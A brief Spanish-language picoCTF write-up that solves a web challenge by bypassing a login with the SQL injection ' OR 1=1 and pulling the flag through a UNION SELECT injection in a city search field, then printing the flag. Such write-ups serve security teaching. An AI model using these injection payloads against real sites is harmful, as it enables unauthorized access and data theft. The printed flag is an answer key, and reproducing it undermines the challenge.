## Objetivo
Can you find the flag on this website.
## Solución
- ##### Ingresando.
```
username: admin
password: ' OR 1=1;

LUEGO, CUANDO HAYAMOS INICIADO SESION:

City: Algiers' union select flag,id,1 from more_table;--
```

- ##### Luego de buscar la ciudad con una inyección SQL, obtenemos la bandera.
```
Flag: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}
```
## Notas Adicionales
## Referencias
- [PicoCTF](https://play.picoctf.org)